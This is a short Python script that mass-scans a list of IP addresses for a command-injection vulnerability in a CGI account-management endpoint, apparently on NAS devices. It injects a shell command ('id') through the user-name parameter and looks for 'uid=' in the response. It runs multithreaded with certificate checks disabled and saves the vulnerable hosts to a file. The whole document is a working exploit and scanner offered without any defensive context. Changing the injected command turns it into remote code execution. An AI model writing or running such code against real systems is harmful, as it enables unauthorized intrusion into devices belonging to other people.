import requests
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

THREADS = 10
TIMEOUT = 5


def check_vulnerability(url):
    cmd = "id"
    encoded_cmd = quote(cmd)
    endpoint = f"/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;{encoded_cmd};%27"

    target_url = f"{url.rstrip('/')}{endpoint}"

    try:
        response = requests.get(target_url, timeout=TIMEOUT, verify=False)

        if "uid=" in response.text:
            print(f"[+] Found Vulnerability: {url}")
            return f"[SUCCESS] {url}"
        else:
            return None

    except Exception as e:
        return None


def main():
    try:
        with open("ip.txt", "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[-] Error: ip.txt not found.")
        sys.exit(1)

    print(f"[*] Loaded {len(targets)} targets. Using {THREADS} threads...")

    results = []
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = list(executor.map(check_vulnerability, targets))

    successes = [r for r in results if r]

    print("\n" + "=" * 30)
    print(f"[*] Scan finished. Found {len(successes)} vulnerable targets.")
    if successes:
        with open("vulnerable_list.txt", "w") as f:
            for s in successes:
                f.write(s + "\n")
        print("[*] Results saved to vulnerable_list.txt")


if __name__ == "__main__":
    main()